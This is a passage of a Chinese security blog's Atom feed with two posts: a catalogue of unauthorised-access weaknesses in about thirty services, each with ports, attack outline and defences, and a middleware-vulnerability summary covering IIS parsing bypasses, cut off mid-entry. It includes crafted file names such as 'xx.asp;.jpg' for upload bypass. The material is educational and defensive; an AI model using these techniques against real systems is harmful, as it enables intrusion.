<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://0kccc.github.io</id>
    <title>okc</title>
    <updated>2022-03-30T03:34:42.484Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://0kccc.github.io"/>
    <link rel="self" href="https://0kccc.github.io/atom.xml"/>
    <subtitle>突击小分队233~</subtitle>
    <logo>https://0kccc.github.io/images/avatar.png</logo>
    <icon>https://0kccc.github.io/favicon.ico</icon>
    <rights>All rights reserved 2022, okc</rights>
    <entry>
        <title type="html"><![CDATA[未授权访问漏洞大合集]]></title>
        <id>https://0kccc.github.io/post/wei-shou-quan-fang-wen-lou-dong-da-he-ji/</id>
        <link href="https://0kccc.github.io/post/wei-shou-quan-fang-wen-lou-dong-da-he-ji/">
        </link>
        <updated>2022-03-30T02:59:02.000Z</updated>
        <content type="html"><![CDATA[<p>🚩[TOC]</p>
<h2 id="0x01-前言">0x01 前言</h2>
<p>未授权访问漏洞是一个在企业内部非常常见的问题，通常是由于认证存在缺陷、无认证或安全配置不当导致。常见于服务端口，接口未限制开放，网页功能通过链接无限制用户访问，低权限用户越权访问高权限功能。由于此类漏洞的攻击成本极低，效果明显，影响巨大，因此此类漏洞必须引起我们的高度重视。</p>
<h2 id="0x02-常见应用服务的未授权访问">0x02 常见应用/服务的未授权访问</h2>
<h4 id="1redis-未授权访问漏洞">1.Redis 未授权访问漏洞</h4>
<h5 id="端口6379">端口：6379</h5>
<h5 id="漏洞描述及危害">漏洞描述及危害</h5>
<p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将Redis服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问Redis以及读取Redis 的数据。攻击者在未授权访问Redis的情况下，利用Redis自身的提供的config命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的/root/.ssh文件夹的authotrized_keys文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器、添加计划任务、写入Webshell等操作。<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/redis.png" alt="" loading="lazy"></p>
<h5 id="防御手段">防御手段</h5>
<ul>
<li>禁止使用root权限启动redis服务。</li>
<li>对redis访问启动密码认证。</li>
<li>添加IP访问限制，并更改默认6379端口。</li>
</ul>
<h4 id="2mongodb-未授权访问漏洞">2.MongoDB 未授权访问漏洞</h4>
<h5 id="端口27017">端口：27017</h5>
<h5 id="漏洞描述及危害-2">漏洞描述及危害</h5>
<p>MongoDB服务安装后，默认未开启权限验证。如果服务监听在0.0.0.0，则可远程无需授权访问数据库。造成未授权访问的根本原因就在于启动 Mongodb 的时候未设置 --auth 也很少会有人会给数据库添加上账号密码（默认空口令），使用默认空口令这将导致恶意攻击者无需进行账号认证就可以登陆到数据服务器。<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/mongodb.png" alt="" loading="lazy"></p>
<h5 id="防御手段-2">防御手段</h5>
<ul>
<li>限制绑定IP，启动时加入参数--bind_ip 127.0.0.1或在 /etc/mongodb.conf文件中添加入：bind_ip = 127.0.0.1；</li>
<li>在admin.system.users中添加用户，启动认证；</li>
<li>设置防火墙策略，限定 IP 访问服务；</li>
<li>禁用HTTP和REST端口，修改配置文件或在启动的时候选择参数nohttpinterface=false；</li>
</ul>
<h4 id="3memcached-未授权访问漏洞">3.Memcached 未授权访问漏洞</h4>
<h5 id="端口11211">端口：11211</h5>
<h5 id="漏洞描述及危害-3">漏洞描述及危害</h5>
<p>Memcached 是一套常用的key-value分布式高速缓存系统，由于Memcached的安全设计缺陷没有权限控制模块，端口对外开放并且没有配置认证选项，未授权用户可直接获取数据库中所有信息，造成严重的信息泄露。<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/memcached.png" alt="" loading="lazy"></p>
<h5 id="防御手段-3">防御手段</h5>
<ul>
<li>修改绑定的IP、端口和指定访问者IP；</li>
<li>设置防火墙策略；</li>
<li>禁止暴露在公网；</li>
<li>配置memcached监听本地回环地址 127.0.0.1；</li>
</ul>
<h4 id="4vnc-未授权访问漏洞">4.VNC 未授权访问漏洞</h4>
<h5 id="端口5900-5905">端口：5900-5905</h5>
<h5 id="漏洞描述及危害-4">漏洞描述及危害</h5>
<p>VNC是基于 UNIX 和 Linux 的免费开源软件由 VNC Server 和 VNC Viewer 两部分组成。VNC 默认端口号为5900、5901。VNC未授权访问漏洞如被利用可能造成恶意用户直接控制target主机。</p>
<h5 id="防御手段-4">防御手段</h5>
<ul>
<li>配置 VNC 客户端登录口令认证并配置符合密码强度要求的密码；</li>
<li>以最小权限的普通用户身份运行操作系统；</li>
</ul>
<h4 id="5nfs-未授权访问漏洞">5.NFS 未授权访问漏洞</h4>
<h5 id="端口2048-2049">端口：2048、2049</h5>
<h5 id="漏洞描述及危害-5">漏洞描述及危害</h5>
<p>Network File System(NFS)，是由SUN公司研制的UNIX表示层协议(pressentation layer protocol)，能使使用者访问网络上别处的文件就像在使用自己的计算机一样。服务器在启用nfs服务以后，由于nfs服务未限制对外访问，导致共享目录泄漏。<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/NFS.png" alt="" loading="lazy"></p>
<h5 id="防御手段-5">防御手段</h5>
<ul>
<li>利用iptables限制端口2049和2048端口的访问，禁止外部访问；</li>
<li>设置/etc/exports，对访问进行控制；</li>
</ul>
<h4 id="6elasticsearch-未授权访问漏洞">6.Elasticsearch 未授权访问漏洞</h4>
<h5 id="端口9200-9300">端口：9200、9300</h5>
<h5 id="漏洞描述及危害-6">漏洞描述及危害</h5>
<p>Elasticsearch是一款java编写的企业级搜索服务，它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful web接口。越来越多的公司使用ELK作为日志分析，启动此服务默认会开放9200端口或者9300端口，攻击者通常可以请求一个开放9200或9300的服务器进行恶意攻击来获取Elasticsearch的所有权限，对数据进行任意操作。<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/elasticsearch.png" alt="" loading="lazy"></p>
<h5 id="防御手段-6">防御手段</h5>
<ul>
<li>访问控制策略，限制IP访问，绑定固定IP；</li>
<li>在config/elasticsearch.yml中为9200端口设置认证等；</li>
</ul>
<h4 id="7docker-未授权访问漏洞">7.Docker 未授权访问漏洞</h4>
<h5 id="端口2375-5678">端口：2375、5678</h5>
<h5 id="漏洞描述及危害-7">漏洞描述及危害</h5>
<p>Docker 是一个开源的引擎可以轻松地为任何应用创建一个轻量级的、可移植的、自给自足的容器。开发者在笔记本上编译测试通过的容器可以批量地在生产环境中部署包括 VMs、bare metal、OpenStack 集群和其他的基础应用平台Docker。<br>
Docker Remote API 是一个取代远程命令行界面（rcli）的REST API。存在问题的版本分别为 1.3 和 1.6因为权限控制等问题导致可以通过 docker client 或者 http 直接请求就可以访问这个 API，通过这个接口，我们可以新建 container，删除已有 container，甚至是获取宿主机的 shell。<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/docker.png" alt="" loading="lazy"></p>
<h5 id="防御手段-7">防御手段</h5>
<ul>
<li>对2375端口做网络访问控制，如ACL控制，或者访问规则；</li>
<li>修改docker swarm的认证方式，使用TLS认证；</li>
</ul>
<h4 id="8jenkins-未授权访问漏洞">8.Jenkins 未授权访问漏洞</h4>
<h5 id="端口8080web端口">端口：8080/web端口</h5>
<h5 id="漏洞描述及危害-8">漏洞描述及危害</h5>
<p>Jenkins是一个开源软件项目，是基于Java开发的一种持续集成工具，用于监控持续重复的工作，旨在提供一个开放易用的软件平台，使软件项目可以进行持续集成。<br>
默认情况下Jenkins面板中用户可以选择执行脚本界面来操作一些系统层命令，攻击者可通过未授权访问漏洞或者暴力破解用户密码等进入后台管理服务，通过脚本执行界面从而获取服务器权限。<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/jenkins.png" alt="" loading="lazy"></p>
<h5 id="防御手段-8">防御手段</h5>
<ul>
<li>升级版本；</li>
<li>添加认证，设置强密码复杂度及账号锁定；</li>
<li>禁止把Jenkins直接暴露在公网；</li>
</ul>
<h4 id="9smb-未授权访问漏洞">9.SMB 未授权访问漏洞</h4>
<h5 id="端口445">端口：445</h5>
<h5 id="漏洞描述及危害-9">漏洞描述及危害</h5>
<p>Samba是一套实现SMB（Server Messages Block）协议、跨平台进行文件共享和打印共享服务的程序。Samba 4.0.4之前版本配置为 Active Directory 域控制器后，非默认的CIFS共享具有全局可写的权限，这可允许经过身份验证的远程用户通过标准文件系统操作，读取、修改、创建或删除任意文件。</p>
<h5 id="防御手段-9">防御手段</h5>
<ul>
<li>配置samba服务设置用户名及符合强度的密码；</li>
<li>限制访问ip；</li>
</ul>
<h4 id="10rsync-未授权访问漏洞">10.Rsync 未授权访问漏洞</h4>
<h5 id="端口873">端口：873</h5>
<h5 id="漏洞描述及危害-10">漏洞描述及危害</h5>
<p>Rsync（remote synchronize）是一个远程数据同步工具，可通过 LAN/WAN 快速同步多台主机间的文件，也可以同步本地硬盘中的不同目录。Rsync默认允许匿名访问，如果在配置文件中没有相关的用户认证以及文件授权，就会被任何人可未授权访问rsync，上传本地文件，下载服务器文件。<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/rsync.png" alt="" loading="lazy"></p>
<h5 id="防御手段-10">防御手段</h5>
<ul>
<li>账户认证：正确配置认证用户名及密码；</li>
<li>权限控制：不需要写入权限的 module 的设置为只读 Read only = true；</li>
<li>网络访问控制：使用安全组策略或白名单限制，只允许必要访问的主机访问；</li>
<li>隐藏 module 信息：修改配置文件 list =false；</li>
</ul>
<h4 id="11zabbix-未授权访问漏洞">11.Zabbix 未授权访问漏洞</h4>
<h5 id="端口10051">端口：10051</h5>
<h5 id="漏洞描述及危害-11">漏洞描述及危害</h5>
<p>zabbix是一个开源的企业级性能监控解决方案。Zabbix能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位/解决存在的各种问题。低版本的zabbix(2.2.x,3.0.0-3.0.3)存在SQL注入漏洞，攻击者无需授权登陆即可登陆zabbix管理系统，也可通过script等功能轻易直接获取zabbix服务器的操作系统权限。<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/zabbix.png" alt="" loading="lazy"></p>
<h5 id="防御手段-11">防御手段</h5>
<ul>
<li>禁用guest登录功能；</li>
<li>zabbix的server和agent都不要以root启动，不要设置AllowRoot=1；</li>
<li>禁止agent执行system.run，不要设置EnableRemoteCommands=1；</li>
</ul>
<h4 id="12svn-未授权访问漏洞">12.SVN 未授权访问漏洞</h4>
<h5 id="端口web端口">端口：web端口</h5>
<h5 id="漏洞描述及危害-12">漏洞描述及危害</h5>
<p>SVN（subversion）是源代码版本管理软件，造成SVN源代码漏洞的主要原因是管理员操作不规范。“在使用SVN管理本地代码过程中，会自动生成一个名为.svn的隐藏文件夹，其中包含重要的源代码信息，如果是使用svn checkout功能来更新代码，而没有配置好目录访问权限则会存在此漏洞，导致网站整个源码文件暴露。<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/svn.png" alt="" loading="lazy"></p>
<h5 id="防御手段-12">防御手段</h5>
<ul>
<li>不要使用svn checkout和svn up更新服务器上的代码，使用svn export（导出）功能代替；</li>
<li>服务器软件（Nginx、apache、tomcat、IIS等）设置目录权限，禁止访问.svn和.git目录；</li>
</ul>
<h4 id="13zookeeper-未授权访问漏洞">13.ZooKeeper 未授权访问漏洞</h4>
<h5 id="端口2181-2182">端口：2181、2182</h5>
<h5 id="漏洞描述及危害-13">漏洞描述及危害</h5>
<p>zookeeper是分布式协同管理工具，常用来管理系统配置信息，提供分布式协同服务。Zookeeper安装部署之后默认情况下不需要任何身份验证，造成攻击者可以远程利用Zookeeper，通过服务器收集敏感信息或者在Zookeeper集群内进行破坏（比如：kill命令）。攻击者能够执行所有只允许由管理员运行的命令。</p>
<h5 id="防御手段-13">防御手段</h5>
<ul>
<li>修改 ZooKeeper 默认端口，采用其他端口服务；</li>
<li>添加访问控制，配置服务来源地址限制策略；</li>
<li>增加 ZooKeeper 的认证配置；</li>
</ul>
<h4 id="14springboot-actuator未授权访问漏洞">14.SpringBoot Actuator未授权访问漏洞</h4>
<h5 id="端口8080web端口-2">端口：8080/web端口</h5>
<h5 id="漏洞描述及危害-14">漏洞描述及危害</h5>
<p>Actuator 是springboot提供的用来对应用系统进行自省和监控的功能模块，借助于 Actuator开发者可以很方便地对应用系统某些监控指标进行查看、统计等。在Actuator启用的情况下，如果没有做好相关权限控制，非法用户可通过访问默认的执行器端点（endpoints）来获取应用系统中的监控信息，从而导致信息泄露甚至服务器被接管的事件发生。<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/springboot.png" alt="" loading="lazy"></p>
<h5 id="防御手段-14">防御手段</h5>
<ul>
<li>禁用/env接口；</li>
<li>升级到SpringBoot Actuator2.0及以上安全版本；</li>
<li>禁止对外开放；</li>
</ul>
<h4 id="15jupyter-notebook-未授权访问漏洞">15.Jupyter Notebook 未授权访问漏洞</h4>
<h5 id="端口8888">端口：8888</h5>
<h5 id="漏洞描述及危害-15">漏洞描述及危害</h5>
<p>Jupyter Notebook（此前被称为IPython notebook）是一个交互式笔记本，支持运行 40 多种编程语言。<br>
如果管理员未为Jupyter Notebook配置密码，将导致未授权访问漏洞，游客可在其中创建一个console并执行任意Python代码和命令。<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/jupyter.png" alt="" loading="lazy"></p>
<h5 id="防御手段-15">防御手段</h5>
<ul>
<li>开启身份验证，防止未经授权用户访问；</li>
<li>访问控制策略，限制IP访问，绑定固定IP；</li>
</ul>
<h4 id="16hadoop-未授权访问漏洞">16.Hadoop 未授权访问漏洞</h4>
<h5 id="端口80web端口-50070">端口：80/web端口、50070</h5>
<h5 id="漏洞描述及危害-16">漏洞描述及危害</h5>
<p>Hadoop是一个由Apache基金会所开发的分布式系统基础架构，由于服务器直接在开放了 Hadoop机器HDFS的50070 web端口及部分默认服务端口，攻击者可以通过命令行操作多个目录下的数据，如进行删除，下载，目录浏览甚至命令执行等操作，产生极大的危害。<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/hadoop.png" alt="" loading="lazy"></p>
<h5 id="防御手段-16">防御手段</h5>
<ul>
<li>开启身份验证，防止未经授权用户访问；</li>
<li>设置“安全组”访问控制策略，将Hadoop默认开放的多个端口对公网全部禁止或限制可信任的IP地址才能访问包括50070以及WebUI等相关端口；</li>
</ul>
<h4 id="17couchdb-未授权访问漏洞">17.CouchDB 未授权访问漏洞</h4>
<h5 id="端口5984-6984">端口：5984、6984</h5>
<h5 id="漏洞描述及危害-17">漏洞描述及危害</h5>
<p>Apache CouchDB是一个面向文档的数据库管理系统。它提供以JSON作为数据格式的REST接口来对其进行操作，并可以通过视图来操纵文档的组织和呈现。默认会在5984端口开放Restful的API接口，如果使用SSL的话就会监听在6984端口，用于数据库的管理功能。其HTTP Server默认开启时没有进行验证，而且绑定在0.0.0.0，所有用户均可通过API访问导致未授权访问。</p>
<h5 id="防御手段-17">防御手段</h5>
<ul>
<li>通过防火墙等安全配置限制访问ip；</li>
<li>设置访问密码；</li>
</ul>
<h4 id="18atlassian-crowd-未授权访问漏洞">18.Atlassian Crowd 未授权访问漏洞</h4>
<h5 id="端口8095">端口：8095</h5>
<h5 id="漏洞描述及危害-18">漏洞描述及危害</h5>
<p>Atlassian Crowd和Atlassian Crowd Data Center都是澳大利亚Atlassian公司的产品。Atlassian Crowd是一套基于Web的单点登录系统。该系统为多用户、网络应用程序和目录服务器提供验证、授权等功能。Atlassian Crowd Data Center是Crowd的集群部署版。<br>
Atlassian Crowd和Crowd Data Center在其某些发行版本中错误地启用了pdkinstall开发插件。从而使攻击者可以在未授权访问的情况下对Atlassian Crowd和Crowd Data Center安装任意的恶意插件，攻击者借用此漏洞安装的恶意插件可以在目标服务器上执行任意命令，从而获得服务器权限。</p>
<h5 id="防御手段-18">防御手段</h5>
<ul>
<li>设置访问/crowd/admin/uploadplugin.action的源ip；</li>
<li>升级到3.5.0及以上安全版本；</li>
</ul>
<h4 id="19jboss-未授权访问漏洞">19.JBOSS 未授权访问漏洞</h4>
<h5 id="端口8080web端口-3">端口：8080/web端口</h5>
<h5 id="漏洞描述及危害-19">漏洞描述及危害</h5>
<p>JBoss是一个基于J2EE的开放源代码应用服务器，代码遵循LGPL许可，可以在任何商业应用中免费使用；JBoss也是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3规范。默认情况下访问 http://ip:8080/jmx-console 就可以浏览JBoss的部署管理的信息不需要输入用户名和密码可以直接部署上传木马有安全隐患。<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/jboss.png" alt="" loading="lazy"></p>
<h5 id="防御手段-19">防御手段</h5>
<ul>
<li>对jmx控制页面访问添加访问验证；</li>
<li>进行JMX Console 安全配置；</li>
</ul>
<h4 id="20druid-未授权访问漏洞">20.Druid 未授权访问漏洞</h4>
<h5 id="端口8081-8084web端口">端口：8081-8084/web端口</h5>
<h5 id="漏洞描述及危害-20">漏洞描述及危害</h5>
<p>Druid是阿里研发的一款数据库连接池，其开发语言为java，druid集合了c3p0、dbcp、proxool等连接池的优点，还加入了日志监控、session监控等数据监控功能，使用Druid能有效的监控DB池连接和SQL的执行情况。druid虽高效好用，但当开发者配置不当时就可能造成未授权访问，攻击者可利用泄露的Session登录后台。</p>
<h5 id="防御手段-20">防御手段</h5>
<ul>
<li>配置web.xml中servlet的初始化参数loginUsername和loginPassword设置访问账号密码；</li>
<li>禁止对外网开放访问或限制访问ip；</li>
</ul>
<h4 id="21ftp-未授权访问漏洞">21.FTP 未授权访问漏洞</h4>
<h5 id="端口21">端口：21</h5>
<h5 id="漏洞描述及危害-21">漏洞描述及危害</h5>
<p>FTP 弱口令或匿名登录漏洞，一般指使用 FTP 的用户启用了匿名登录功能，或系统口令的长度太短、复杂度不够、仅包含数字、或仅包含字母等，容易被黑客攻击，发生恶意文件上传或更严重的入侵行为。</p>
<h5 id="防御手段-21">防御手段</h5>
<ul>
<li>禁止匿名登录；</li>
<li>配置强密码且密码长度建议八位以上，应包括大小写字母、特殊字符、数字混合体；</li>
</ul>
<h4 id="22kibana-未授权访问漏洞">22.Kibana 未授权访问漏洞</h4>
<h5 id="端口5601">端口：5601</h5>
<h5 id="漏洞描述及危害-22">漏洞描述及危害</h5>
<p>Kibana是一个开源的分析与可视化平台，设计出来用于和Elasticsearch一起使用的，你可以用kibana搜索、查看存放在Elasticsearch中的数据。Kibana如果允许外网访问，且没有做安全登录认证，也会被外部随意访问查看所有的数据，造成严重的数据泄露。</p>
<h5 id="防御手段-22">防御手段</h5>
<ul>
<li>设置kibana监听本地地址，并设置ElasticSearch登录的账号和密码；</li>
<li>设置防火墙策略，限定IP访问服务；</li>
</ul>
<h4 id="23ldap-未授权访问漏洞">23.LDAP 未授权访问漏洞</h4>
<h5 id="端口389">端口：389</h5>
<h5 id="漏洞描述及危害-23">漏洞描述及危害</h5>
<p>LDAP中文全称为：轻型目录访问协议（Lightweight Directory Access Protocol），默认使用389，LDAP底层一般使用TCP或UDP作为传输协议。目录服务是一个特殊的数据库，是一种以树状结构的目录数据库为基础。未对LDAP的访问进行密码验证，导致未授权访问。</p>
<h5 id="防御手段-23">防御手段</h5>
<ul>
<li>修改ldap的acl，禁止匿名访问；</li>
<li>根据业务设置ldap访问白名单或黑名单；</li>
</ul>
<h4 id="24solr-未授权访问漏洞">24.Solr 未授权访问漏洞</h4>
<h5 id="端口8983">端口：8983</h5>
<h5 id="漏洞描述及危害-24">漏洞描述及危害</h5>
<p>Solr是一个高性能，采用Java开发，基于Lucene的全文搜索服务器。同时对其进行了扩展，提供了比Lucene更为丰富的查询语言，同时实现了可配置、可扩展并对查询性能进行了优化，并且提供了一个完善的功能管理界面，是一款非常优秀的全文搜索引擎。solr如果没有安全配置直接暴露在公网上危害很大，攻击者可直接未授权访问查询所有数据库信息，进一步可读取系统任意文件，甚至getshell。<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/solr.png" alt="" loading="lazy"></p>
<h5 id="防御手段-24">防御手段</h5>
<ul>
<li>配置solr访问控制权限；</li>
<li>禁止将solr暴露在公网；</li>
</ul>
<h4 id="25spark-未授权访问漏洞">25.Spark 未授权访问漏洞</h4>
<h5 id="端口8080-8081-6066-7077">端口：8080、8081、6066、7077</h5>
<h5 id="漏洞描述及危害-25">漏洞描述及危害</h5>
<p>Apache Spark是一款集群计算系统，其支持用户向管理节点提交应用，并分发给集群执行。如果管理节点未启动访问控制，攻击者可以在集群中执行任意代码。该漏洞的本质是未授权用户可以向Master节点提交一个应用，Master节点会分发给Slave节点执行应用。如果应用中包含恶意代码，会导致任意代码执行，威胁Spark集群整体的安全性。</p>
<h5 id="防御手段-25">防御手段</h5>
<ul>
<li>关闭对外端口：对外关闭8080(Standalone Master Web UI端口)、8081(Standalone Worker Web UI端口)、6066(Standalone Master Rest Server Api端口)、7077(Standalone Master集群作业提交端口)等Spark端口；</li>
<li>权限认证：用户可以自定义javax servlet filter来对登陆用户进行认证，Spark会根据用户的ACL（访问控制列表）来确保该登陆用户有权限访问某个Spark应用的web UI；</li>
<li>开启Spnego Authentication认证机制；</li>
</ul>
<h4 id="26weblogic-未授权访问漏洞">26.Weblogic 未授权访问漏洞</h4>
<h5 id="端口7001">端口：7001</h5>
<h5 id="漏洞描述及危害-26">漏洞描述及危害</h5>
<p>Weblogic是Oracle公司推出的J2EE应用服务器，CVE-2020-14882允许未授权的用户绕过管理控制台的权限验证访问后台，CVE-2020-14883允许后台任意用户通过HTTP协议执行任意命令。使用这两个漏洞组成的利用链，可通过一个GET请求在远程Weblogic服务器上以未授权的任意用户身份执行命令。（<strong>上述受影响的Weblogic版本：10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0</strong>）<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/weblogic.png" alt="" loading="lazy"></p>
<h5 id="防御手段-26">防御手段</h5>
<ul>
<li>根据版本下载最新的漏洞补丁：https://support.oracle.com/portal/；</li>
</ul>
<h4 id="27dubbo-未授权访问漏洞">27.Dubbo 未授权访问漏洞</h4>
<h5 id="端口20880">端口：20880</h5>
<h5 id="漏洞描述及危害-27">漏洞描述及危害</h5>
<p>Apache Dubbo是阿里巴巴公司开源的一个高性能优秀的服务框架，使得应用可通过高性能的RPC实现服务的输出和输入功能，可以和Spring框架无缝集成。dubbo因配置不当导致未授权访问漏洞。<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/dubbo.png" alt="" loading="lazy"></p>
<h5 id="防御手段-27">防御手段</h5>
<ul>
<li>配置dubbo认证；</li>
<li>设置防火墙策略，限定IP访问；</li>
</ul>
<h4 id="28php-fpm-fastcgi未授权访问漏洞">28.PHP-FPM Fastcgi未授权访问漏洞</h4>
<h5 id="端口9000">端口：9000</h5>
<h5 id="漏洞描述及危害-28">漏洞描述及危害</h5>
<p>Fastcgi是一个通信协议，和HTTP协议一样，都是进行数据交换的一个通道。类比HTTP协议来说，fastcgi协议则是服务器中间件和某个语言后端进行数据交换的协议。PHP-FPM是一个fastcgi协议解析器，Nginx等服务器中间件将用户请求按照fastcgi的规则打包好传给FPM。FPM按照fastcgi的协议将TCP流解析成真正的数据。PHP-FPM默认监听9000端口，如果这个端口暴露在公网，则我们可以自己构造fastcgi协议，和fpm进行通信。<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/php-fpm.png" alt="" loading="lazy"></p>
<h5 id="防御手段-28">防御手段</h5>
<ul>
<li>禁止默认端口对外开放访问；</li>
<li>限制访问源ip；</li>
</ul>
<h4 id="29swagger-未授权访问漏洞">29.Swagger 未授权访问漏洞</h4>
<h5 id="端口web端口-2">端口：web端口</h5>
<h5 id="漏洞描述及危害-29">漏洞描述及危害</h5>
<p>Swagger是一个规范且完整的框架，用于生成、描述、调用和可视化RESTful风格的Web 服务。Swagger的目标是对REST API定义一个标准且和语言无关的接口，可以让人和计算机拥有无须访问源码、文档或网络流量监测就可以发现和理解服务的能力。如果开发者配置不当的话会导致存在未授权访问漏洞，进而获取接口中存在查询用户信息、上传文件等多个敏感操作。<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/Swagger.png" alt="" loading="lazy"></p>
<h5 id="防御手段-29">防御手段</h5>
<ul>
<li>对Swagger生成接口文档进行权限验证；</li>
<li>限制访问ip；</li>
</ul>
<h4 id="30gitlab-未授权访问漏洞">30.GitLab 未授权访问漏洞</h4>
<h5 id="端口20880-2">端口：20880</h5>
<h5 id="漏洞描述及危害-30">漏洞描述及危害</h5>
<p>GitLab是一个利用Ruby on Rails开发的开源应用程序，实现一个自托管的Git项目仓库，可通过Web界面进行访问公开的或者私人项目。在8.13.0版本之前，由于GitLab没有检查符号链接（symlinks），因此经过身份验证的用户可以检索任何GitLab账户中的文件，甚至是secret tokens等敏感信息，进而导致远程命令执行。</p>
<h5 id="防御手段-30">防御手段</h5>
<ul>
<li>升级Gitlab至安全版本；</li>
<li>关闭GitLab export；</li>
</ul>
<h2 id="0x03-总结">0x03 总结</h2>
<p>以上都是我们工作中经常使用、测试的系统服务，未授权访问漏洞是常见的攻击入口点，某些严重的未授权访问会直接导致getshell。产生未授权漏洞的根本原因其实是访问控制没有做好， 在内网中存在大量的未授权访问漏洞，因为绝大多数人认为只要在内网就安全了。虽然攻击者无法从外部直接攻击，但是一旦进入内网，将对系统造成无法挽回的损失。所以能设置账户密码尽量设置密码，能开启访问控制尽量开启访问控制，或者使用二次认证、零信任网关等形式。</p>
<h2 id="0x04-参考">0x04 参考</h2>
<p>https://www.freebuf.com/vuls/254160.html<br>
https://xz.aliyun.com/t/6103</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[常用Web中间件漏洞总结]]></title>
        <id>https://0kccc.github.io/post/chang-yong-web-zhong-jian-jian-lou-dong-zong-jie/</id>
        <link href="https://0kccc.github.io/post/chang-yong-web-zhong-jian-jian-lou-dong-zong-jie/">
        </link>
        <updated>2022-03-30T02:53:18.000Z</updated>
        <content type="html"><![CDATA[<h2 id="一-简介">一、简介</h2>
<p>工作中我们比较常用的web中间件有IIS、Apache、Nginx、Tomcat、JBoss、Weblogic、GlassFish、WebSphere、jetty等等，其中因为版本过旧、配置不当等因素会导致我们的网站存在不同程度的安全隐患；因此，熟悉这些中间件漏洞产生的原理对于保护我们网站的安全起关键性作用！</p>
<h2 id="二-中间件漏洞">二、中间件漏洞</h2>
<h3 id="1iis">1.IIS</h3>
<ul>
<li><strong>1.1 IIS 5.x-6.x解析漏洞</strong><br>
使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。<br>
<strong>漏洞原理：</strong><br>
基于文件名，该版本默认会将“*.asp;.jpg”此种格式的文件名，当成asp解析，原理是 服务器默认不解析;号及其后面的内容，相当于截断。</li>
</ul>
<pre><code>例如：www.xxx.com/xx.asp;.jpg
</code></pre>
<p>基于文件夹名，该版本默认会将“*.asp/”目录下的所有文件当成asp解析。</p>
<pre><code>例如：www.xxx.com/xx.asp/xx.jpg
</code></pre>
<p>此外，该版本除了会将扩展名为.asp的文件解析为asp之外，还默认会将扩展名为.asa，.cdx，.cer的文件解析为asp文件。<br>
<strong>修复方案：</strong><br>
(1).限制上传目录执行权限，不允许执行脚本；<br>
(2).不允许新建目录；<br>
(3).利用正则阻止上传xx.asp;.jpg类型的文件名，上传的文件需经过重命名(时间戳+随机数+.jpg等)。</p>
<ul>
<li><strong>1.2 IIS 7.5解析漏洞</strong><br>
<strong>漏洞原理：</strong><br>
IIS7.5的漏洞与nginx解析漏洞的类似，都是由于php配置文件中，开启了“cgi.fix_pathinfo”，而这并不是nginx或者iis7.5本身的漏洞；php.ini里如果默认“cgi.fix_pathinfo=1”，就会将后缀名为.php的路径当做php文件进行解析。</li>
</ul>
<pre><code>#例如url
http://127.0.0.1/upload/test.jpg
#在test.jpg路径下加上.php格式访问，就会把原test.jpg解析为test.php
http://127.0.0.1/upload/test.jpg/.php

</code></pre>
<p><img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/IIS7.5.png" alt="" loading="lazy"><br>
<strong>修复方案：</strong><br>
(1).配置cgi.pathinfo(php.ini中)为0并重启php-cgi程序;<br>
(2).在”Handler Mapping”勾选php-cgi.exe程序的”Invoke handler only if request is mapped to”;</p>
<ul>
<li><strong>1.3 IIS PUT漏洞</strong><br>
<strong>漏洞原理：</strong><br>
IIS6.0 Server在Web服务扩展中开启WebDAV，配置了可以写入权限，造成任意文件上传。<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/iisput.png" alt="" loading="lazy"><br>
<strong>修复方案：</strong><br>
关闭WebDAV和写入权限。</li>
<li><strong>1.4 IIS 远程代码执行漏洞(CVE-2017-7269)</strong><br>
<strong>漏洞原理：</strong><br>
Microsoft Windows Server 2003 R2中的Internet信息服务（IIS）6.0中的WebDAV服务中的ScStoragePathFromUrl函数中的缓冲区溢出允许远程攻击者通过以”If：&lt;http：//“开头的长标头执行任意代码PROPFIND请求。<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/CVE-2017-7269.png" alt="" loading="lazy"><br>
<strong>修复方案：</strong><br>
关闭 WebDAV</li>
<li><strong>1.5 IIS HTTP.SYS远程代码执行(MS15-034)</strong><br>
<strong>漏洞原理：</strong><br>
